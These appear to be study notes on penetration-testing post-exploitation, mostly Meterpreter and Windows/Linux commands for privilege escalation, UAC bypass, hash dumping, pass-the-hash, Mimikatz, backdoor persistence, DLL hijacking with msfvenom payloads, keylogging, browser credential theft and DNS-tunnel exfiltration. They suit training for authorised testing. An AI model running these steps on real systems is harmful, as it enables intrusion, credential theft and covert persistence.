Post Exploitation 
Very important to follow the rules of engagement in this stage.
Keep very well documented notes in this stage. Any chnages made need to be documented and reported



Privilage Escalation and Maintaining Access
Vertical - Going Up! “Think user to admin”
Horozontal- Think user to user

Local Exploits 
Require prior access on the target system.
Goal is to exploit operating systems or application vulnerabilities in order to increase privileges on the target machine.\

Starting from a meterpreter shell
meterpreter#sysinfo
• What type of machine are we dealing with here?
• We need to ensure we astable seesion!
• In order to do this we will migrat or prcoess 
meterpreter# help or ?     (show all the commands we can run)
meterpreter#run tab+tab     (display scripts)
Migrating
meterpreter#getpid 
meterpreter#ps
meterpreter#run post/windows/manage/migrate    (automatically migrate to another process) (notepad.txt) (migrate <pid> or <name> to migrate to)
meterpreter#getpid    (see new pid)
Persistence
meterpreter#getsystem  (automatically find best technique to escalate privileges)  (only on windows machines)
meterpreter#getsystem -t 1 (run a specific technique)
• For other modules, you can navigate to exploit/{os}/local path
• When UAC is enabled on the remote system, we can run bypassuac in orde to bypass it.
• To verify if UAC is enabled, we can run post/windows/gather/win_privs
#search bypassuac   (See some of the modules offered by metasploit to bypass the UAC protection mechanism)  (set sess id and then run) (only a bypass. UAC will still be enabled)
• Now run getsystem again 
meterpreter#getsystem    (And it should worl now!)
• At this stage we can now use Incognito. It will allow us to impersonate other valid user tokens on that machine and become that user.
meterpreter#use incognito
meterpreter#list_tokens or impersonate_token <token to impersonate>
Unquoted Service Paths
• Another mathod we can use to get persistence on a windows target.
• We're able to abuse the way that Windows searches for executables belonging to a service
• In many cases we are able to abuse this to obtain persistence to a system as the currently logged-on user or escalate our privilages to SYSTEM.
• A misconfugration, where a path to a service binary is unquoted, and additionally, contains spaces in its path.
• If the user we are signed in as has the right permissions to write to the directory we are in, we could place our own program in there, adn when the service starts, it would launch our executable, instead of the OG.
Finding Unquoted Paths
#wmic service get name,,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “”"
#sc qc <service_name>    (manually check for an unquoted path)
Metasploit : use exploit/windows/local/trusted_service_path
Linux Privesc
• Get information about the current OS, and then search for publicly availabe exploits.
• Privesc exploits are very OS specific. Info on OS and APPs will be extremely useful in this phase. 
• Once you have the info you need, search for a public exploit. 
   ◇ Once you have an exploit you will now have to compile it on either the target machine or your own. 
Target Machine
meterpreter#upload /path_of_file
meterpreter#shell
#gcc file -o exploit
#ls -la
#./exploit
Our Machine
#gcc -m32 -o linux_priv_esc file
Now that we have a compiled version of the exploit we can upload it through meterpreter:>
meterpreter#upload file
#chmod +x file
#./exploit
Maintaining Access
Techniques:
• Password Hash 
• Backdoor 
• New Users
• Services such as RDP, VNC, Telnet, etc..
   ◇ Services are active and we need credentials
   ◇ No services in place and we need to activate them
   ◇ For New users we need to add them for each services or activate them. 
Recovering the password hash:
meterpreter#run hashdump  (may have to migrate to a different process)
Pass The Hash 
If we are unable to crack the hash we may need to pass the hash
• Passing the hash allows us to connect to a remote machine, by means of the hash without using the actual plain-text password.
• Allows the attacker to use LM and NTLM hashes to authenticate to a remote host
• If we gather admin hashes we can mount pass the hash attacks on all the machines in the network. This is very dangerous since the same accounts(username and password_hash) can be used on multiple machines.
Psexec Module
use exploit/windows/smb/psexec
• Sometimes an account may be in the admins group, but not an “actual” admin
• If this is the case then we need to go into the registery and make some changes:


OR



OR 

#reg add <key>

• These changes allow non RID-500 user accounts(users in the local administrator group for instance) to successfully pass-the-hash in some cases.
• Could also use xfreerdp (rdp client for linux)
#xfreerdp /u:admin /d:foocorp /pth:<hash> /v:IP
Actually cracking hashes will be covered in system security.

Using Mimikatz
May be able to retrieve plain-text passwords with this tool.
• It extracts plaintext passwords, kerberos tickets, perform pass-the-hash attacks and much more.
• Can use the tool directly from metasploit.
• Make sure we are running on a 64bit process
meterpreter#sysinfo
meterpreter#load mimikatz
meterpreter#wdigest   (retrieve credentials)
Windows Credentials Editor
meterpreter#execute -i -f wce.exe -a -h 

RDP
• Now that we have a working set of credentials, we want to check if the RDP service is active on the target, since we want to use it for backdoor access.
#net start (check enabled services)
• make sure you are in a shell when running these commands*
Check with meterpreter scripts
#run service_manager -1 
#run post/windows/gather/enum_services
Enablling RDP
meterpreter#run getgui -e (enable rdp)
• Must ensure target user can connect through rdp. If not we must grant him privilages by adding him to the Remote Desktop Users Group
• Also we need to make sure that the windows firewall does not block the connections

#net localgroup “Remote Desktop Users” user /add
• Verify using:
#rdesktop IP -u username -p PWD
#net localgroup (list groups and add users to them)
#net localgroup “Remote Desktop Users” (list users in the RDP group)
• Now we can add users to group lists as well. Like adding a standard user into the admins group)

Installing a Backdoor
1. Upload the backdoor 
2. Execute the file. At prefixed times(i.e. 5-6-10 seconds)
3. Run it automatically at boot (done by editing Windows registry, services, schedules, rc.local, init.d, etc depending on target machine).
• Script only works on windows machines:
meterpreter#run persistence -h 

• After that simply set your listener and wait for incoming connection

Creating a new user
• Can be done easily by running the net user and net localgroup commands
• Once the user is created, you have to join groups that allow you access to services such as RDP or Telnet and so on.

DLL Hijacking / Preloading (Insecure Library Loading)
• DLL Hijacking allows us the ability to abuse a built-in behavior in the way that executables, when launched, search for Dynamic Link Libraries(DLL's) to import.
• This behavior is known as the DLL Search Order.


Example from Skype Hack:






• These ar  just a few examples of hundreds of applications that are vulnerable to DLL hijacking
“Process Monitor” from the SysInternals Suite
Indentifying Typical DLL Hijacking Oppertunities
1. Create a procmon filter for a specific executable we'd like to investigate, and also, create a filter for “NAME NOT FOUND” for the result column.
2. Identify cases where the application is looking for a DLL in a directory which we can write to or modify.
3. Drop our modified payload in the writable directory
4. restart the service, relaunch the app, or wait for system reboot

Windows
meterpreter#getprivs
meterpreter#run post/windows/gather/win_privs
UACMe tool 

DLL Hijacking
• DLL Search Order (target this)
• Use Process Monitor tool from sysinternals suite
   ◇ Use Process Explorer tool from sysinternals suite
      ▪ Check out the processes 
      ▪ select user name option
      ▪ Now we can see privilages for each service
      ▪ Lookin for 3rd party apps or processes running as Authority System
      ▪ Objective: Identify issues reagarding the way these applications are loading DLLs upon startup
      ▪ note the path of the application and services it is attached.
• Now open the Process Monitor tool 
   ◇ Process Monitor filter 
   ◇ process name: is RegSrvc.exe(example)
   ◇ open services applet and find associated services
   ◇ find the app through the associated service
   ◇ Stop and restart the service from services and watch in process monitor
   ◇ Can see the DLLs being loaded in the process monitor
   ◇ Find the Name not found(insert our own DLL file) 
   ◇ Create payload using msfvenom
   ◇ use multi/handler
   ◇ set options
   ◇ run 
   ◇ upload our malicious DLL file through Metasploit
   ◇ Rename to the DLL name that the process is looking for upon startup
   ◇ now stop and start the service on the victim machine, and you should have a callback to your meterpreter session as SYSTEM AUTHORITY
   ◇ This is a great way to maintain persistence on the machine as well since it will callback on every bootup.
   Pillaging or Data Harvesting
• In this phase we gather all the local information on the compromised machine. Such as files, credentials, accounts, IM logs, network information. Network information will be used for mapping the internal network.
meterpreter# sysinfo (basic system information) 
meterpreter# getuid (check the user we are running as)
• Figure out the role of the victim machine. If it is a server then what services are running on it.
   ◇ Is it a workstation or is it a server?
   ◇ Type of workstation or server
   ◇ meterpreter# run post/windows/gather/
   ◇ meterpreter# run post/linux/gather
   ◇ meterpreter# use post/windows/gather/enum_services 
• We can also just pop a shell and use windows or linux commands
   ◇ Windows: 
      ▪ wmic service get Caption,StartName,State,pathname
      ▪ net start 
      ▪ net view/domain  (check if the machine is part of a domain or even a DC)
      ▪ net group “Domain Controllers” /domain  ( print the list of Domain Controllers)
      ▪ net user  (get info about users)
      ▪ meterpreter# run post/windows/gather/enum_ad_users  (enumerate accounts and other info in the active domain)
      ▪ meterpreter# run post/windows/gather/enum_ad_(many other options here as well)
      ▪ net user /domain
      ▪ net localgroup <group_name>
      ▪ net share
      ▪ meterpreter# enum_shares
   * Linux:
      ▪ service --status-all
      ▪ ps
      ▪ enum_domains script  
      ▪ cat /etc/passwd    (get info about users

Pillaging Resources
Windows: https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US
Linux: https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US
Metasploit: https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1
https://github.com/mubix/post-exploitation-wiki
Linux: https://web.archive.org/web/20150317144317/https:/n0where.net/linux-post-exploitation
Windows: https://tim3warri0r.blogspot.com/

Metasploit Harvesting Scripts
• Scraper and winenum
• they automatically save all the information gathered into local files.
meterpreter# screenshot (take screenshot of victim machine)

Running Keyloggers
Metasploit scripts
• keyscan_start and keylogrecorder
• Need to be attached to the process that we want to record keystrokes on
• run keyscan_dump to see results of keylogger
• keyscan_stop (stop the sniffer) 

Meterpreter Pillaging
meterpreter# search
meterpreter# download
meterpreter# search -d X:\\Users\\els\\ -f *.kdbx  (Search for a specific file extension.
• Web browser history is a great place to look.
meterpreter# run post/windows/gather/credentials (script for getting credentials stored on a machine)
meterpreter# run post/windows/gather/enum_chrome   (script for grabbing credentials stored in google chrome.
meterpreter# post/multi/gather   (all available scripts for gathering)
meterpreter# run post/windows/gather/enum_applications
• Web Browser Pass View tool

DNS Tunneling 
-Using DNS data exfiltration 
 * We discover a machine that doesnt have internet access, but still has a DNS resolver and can resolve names to IPs(verified by checking /etc/resolv.conf and pinging a website).
• Iodine tool 
   ◇ Useful for data exfiltration, bypassing captive portals seen in wireless networks


• Once the DNS tunnel is establishe, the client transmits all network traffic, encoded, and in the form of DNS queries, typically as TXT records, through the tunnel, which is then decoded at the other end by the server component or attacker-controlled “DNS Server”.
• From there, there we can trivially tunnel all of our traffic through an SSH socks server, completely over DNS, bypassing firewalls or any authenticated proxies along the way.
Pre-requisites:
• Control over a domain name that you own and its DNS configuration.
• An IP address to act as the authoritative Name Server for your domain name for which you have SSH access to as well.
DNS Tunneling requires a client/server model.

Mapping The Internal Network
Using access gained to internal machine as a bridge.

Collecting information:
• Network equipment such as firewalls, switches, routers
• Other networked hosts and servers
   ◇ For each, you should learn about OS, open ports, exploitable services and more. 
• Networking protocols and IP addresses
• Traffic and data transmitted in the network
Mapping The Network: Commands
Starting with if/ipconfig
route print/route -v
meterpreter# arp   (see arp cache)
• Note down newly found targets as you go.
meterpreter# netstat   (display all host connections: listening ports, established connections, and also the process associated with each connection)
• Now we will use the exploited machine as a router to scan and detect all other hosts on the internal network. This way we can avoid security measures such as firewalls and IDS that may bloack incoming external connections.
meterpreter# run arp_scanner -h
EX: run arp_scanner -r 10.10.10.0/24
meterpreter# use post/multi/gather/ping_sweep  (set options)
meterpreter# set RHOSTS 10.10.11.0/24 (change to newly found network)
meterpreter# run netenum -h (very useful)
